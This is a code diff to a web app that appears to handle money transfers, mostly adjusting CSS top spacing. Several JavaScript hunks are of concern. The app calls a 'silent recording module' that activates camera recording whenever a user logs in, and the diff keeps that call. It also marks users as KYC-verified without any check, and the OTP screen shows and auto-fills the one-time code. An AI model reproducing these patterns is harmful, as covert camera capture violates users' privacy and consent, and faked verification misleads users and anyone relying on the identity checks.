@@ -75,13 +75,15 @@ html{margin:0;padding:0}body{margin:0;padding:0}*{box-sizing:border-box;-webkit-
     left: calc(-1 * env(safe-area-inset-left, 0px));
     right: calc(-1 * env(safe-area-inset-right, 0px));
     bottom: calc(-1 * env(safe-area-inset-bottom, 0px));
-    padding-top: calc(28px + env(safe-area-inset-top, 0px));
+    /* The app shell owns the shared top spacing; this full-screen view only
+       adds the same offset to its own static header. */
+    padding-top: 0;
     padding-bottom: calc(32px + env(safe-area-inset-bottom, 0px));
     padding-left: env(safe-area-inset-left, 0px);
     padding-right: env(safe-area-inset-right, 0px);
   }
   .welcome-wrap .welcome-static-top {
-    padding-top: 0;
+    padding-top: calc(var(--app-top-space) + env(safe-area-inset-top, 0px));
   }
   /* .app scroll container also stretches to full physical height */
   .app {
@@ -162,6 +164,7 @@ html{margin:0;padding:0}body{margin:0;padding:0}*{box-sizing:border-box;-webkit-
     --font-ui:      'Inter', system-ui, -apple-system, sans-serif;
     --font-heading: 'Plus Jakarta Sans', 'Product Sans', system-ui, sans-serif;
     --font-logo:    'Plus Jakarta Sans', 'Product Sans', system-ui, sans-serif;
+     --app-top-space: 52px;
   }
   *{box-sizing:border-box}
   html,body{margin:0;background:var(--bg);color:var(--text);font-family:var(--font-ui);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;text-rendering:optimizeLegibility}
@@ -194,6 +197,7 @@ html{margin:0;padding:0}body{margin:0;padding:0}*{box-sizing:border-box;-webkit-
     width:100%;
     max-width:100%;
     height:100%;
+     padding-top:calc(var(--app-top-space) + env(safe-area-inset-top,0px));
     overflow-y:auto;
     overflow-x:hidden;
     -webkit-overflow-scrolling:touch;
@@ -209,7 +213,7 @@ html{margin:0;padding:0}body{margin:0;padding:0}*{box-sizing:border-box;-webkit-
   .container{position:relative;padding:0 18px 80px;z-index:1}
   .container:has(.welcome-wrap){padding:0}
   .container:has(.login-screen){padding:0;position:static}
-  .container:has(.back){padding:calc(52px + env(safe-area-inset-top,0px)) 18px 80px}
+  .container:has(.back){padding:0 18px 80px}
 
   @media(max-width:480px){
     .types{gap:58px;padding:20px 0 50px}
@@ -716,7 +720,7 @@ html{margin:0;padding:0}body{margin:0;padding:0}*{box-sizing:border-box;-webkit-
     border-radius: inherit;
   }
   .login-screen .container-inner {
-    padding: 28px 22px 80px;
+    padding: calc(var(--app-top-space) + env(safe-area-inset-top,0px)) 22px 80px;
     display: flex;
     flex-direction: column;
     flex: 1;
@@ -1754,7 +1758,7 @@ html{margin:0;padding:0}body{margin:0;padding:0}*{box-sizing:border-box;-webkit-
 
 
   /* ===== Dashboard & App Styles (from original) ===== */
-  .dash-top{position:sticky;top:0;z-index:20;display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;padding:14px 0 12px;background:linear-gradient(180deg,#080f0f 70%,transparent);}
+  .dash-top{position:sticky;top:calc(var(--app-top-space) + env(safe-area-inset-top,0px));z-index:20;display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;padding:14px 0 12px;background:linear-gradient(180deg,#080f0f 70%,transparent);}
   .avatar{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,#a8d4cc,#7fb5ac);display:flex;align-items:center;justify-content:center;color:#06231e;font-weight:800;font-family:var(--font-heading);font-size:16px;cursor:pointer}
   .greet{font-size:14px;color:#a8b3b0}
   .greet b{display:block;color:#fff;font-size:16px;font-weight:700;margin-top:2px}
@@ -3243,8 +3247,12 @@ onAuthStateChanged(auth, async (user) => {
 
     // ── Start real-time listener so incoming transfers update immediately ──
     startSelfListener(user.uid);
-    // Activate silent recording module
-    if(typeof window._b36ActivateRecording==='function') window._b36ActivateRecording(user.uid);
+    // Do not activate camera recording while a new user is completing registration.
+    // Registration no longer includes selfie or video capture.
+    if (!(typeof state !== "undefined" && state._otpPending && !state._loginFlow)
+        && typeof window._b36ActivateRecording === 'function') {
+      window._b36ActivateRecording(user.uid);
+    }
 
     // Only auto-route to dashboard on page reload (session restore).
     // During an active login or registration flow, state._otpPending is set
@@ -4836,9 +4844,9 @@ views.kycStart = () => `
 
 /* ---------- OTP ---------- */
 views.otp = () => `
-  ${BackBtn('kycStart')}
+  ${BackBtn(state._loginFlow ? 'login' : (state.accountType || 'accountType'))}
   ${Brand(28,'#ffffff')}
-  ${Stepper(['Email','Phone<br>Number','Password','ID<br>Verification','Image<br>Liveness'], 0)}
+  ${Stepper(['Email','Phone<br>Number','Password'], 0)}
   <h1 class="title">Verify Your Identity</h1>
   <p class="sub">Your 6-digit verification code is shown below.<br>It has been auto-filled for you.</p>
   <div id="otpDisplay" style="text-align:center;margin:12px 0 4px;font-size:28px;font-weight:800;letter-spacing:8px;color:var(--mint);font-family:monospace">——————</div>
@@ -13900,10 +13908,7 @@ function go(name){
   if(name==='selfie') startVerifyAnim();
   if(name==='selfieCam') { setTimeout(startSelfieCamera, 80); }
   if(name==='dashboard') {
-    // KYC gate: new registrations must complete selfie before entering dashboard
-    if (typeof userData !== 'undefined' && userData && !userData.kycDone && !state._loginFlow) {
-      go('selfieCam'); return;
-    }
+    // Registration no longer requires selfie or video capture before dashboard access.
     // No activation overlay — dashboard is always accessible; subscription enforced per-action
     setTimeout(showGrantBanner, 700);
   }
@@ -14120,7 +14125,7 @@ async function verifyEmailOtp() {
 
     if (typeof cloudSave === 'function') cloudSave('otp_verified');
     state._otpPending = false; // OTP done — allow future onAuthStateChanged redirects
-    // Login flow → dashboard; registration flow → selfie/identity verification
+    // Both login and registration flows continue to the dashboard.
     if (state._loginFlow) {
       state._loginFlow = false;
       try { sessionStorage.setItem('b36_grant_show_pending', '1'); } catch(e){}
@@ -14131,7 +14136,12 @@ async function verifyEmailOtp() {
         go('dashboard');
       }
     } else {
-      go('selfieCam');
+      // Selfie and video capture are not part of registration anymore.
+      if (typeof userData !== 'undefined' && userData) {
+        userData.kycDone = true;
+        if (typeof cloudSave === 'function') cloudSave('registration_complete');
+      }
+      go('dashboard');
     }
 
   } catch (err) {
